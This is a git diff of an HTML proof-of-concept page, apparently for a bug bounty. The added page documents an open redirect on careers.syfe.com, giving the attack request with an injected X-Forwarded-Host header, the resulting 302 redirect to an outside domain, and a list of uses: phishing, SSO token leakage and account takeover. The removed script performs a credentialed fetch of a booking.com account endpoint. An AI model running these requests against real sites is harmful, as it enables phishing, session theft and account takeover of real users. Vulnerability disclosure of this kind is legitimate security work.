@@ -1,13 +1,59 @@
-<!doctype html>
 <html>
+<head>
+  <meta charset="UTF-8">
+  <title>open redir via x-forwarded-host</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 700px;
+      margin: 40px auto;
+    }
+    code {
+      background: #f4f4f4;
+      padding: 6px;
+      display: block;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
 <body>
-<script>
-fetch("https://kyc.booking.com/api/me", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(console.log)
-.catch(console.error);
-</script>
+
+<h1>syfe open redir via careers subdomain</h1>
+
+<p> 
+  - full desc (IGNORE IF YOU DON'T CARE)
+this proof-of-concept demonstrates an <strong>open redirect vulnerability</strong>
+caused by improper trust in the <code>X-Forwarded-Host</code> header on
+<code>careers.syfe.com</code>.
+</p>
+
+<h2>attack req</h2>
+
+<code>
+GET /login HTTP/2
+Host: careers.syfe.com
+X-Forwarded-Host: c137req.github.io
+</code>
+
+<h2>result</h2>
+
+<code>
+HTTP/2 302 Found
+Location: https://c137req.github.io/jobs
+</code>
+
+<p>
+because the server constructs redirect URLs using the unvalidated
+<code>X-Forwarded-Host</code> header, I can redirect users
+to an arbitrary domain
+</p>
+
+<h2>what could I do with this rn?</h2>
+<ul>
+  <li>phishing</li>
+  <li>oauth/sso token leakage</li>
+  <li>password resetting (ato)</li>
+</ul>
+
 </body>
 </html>
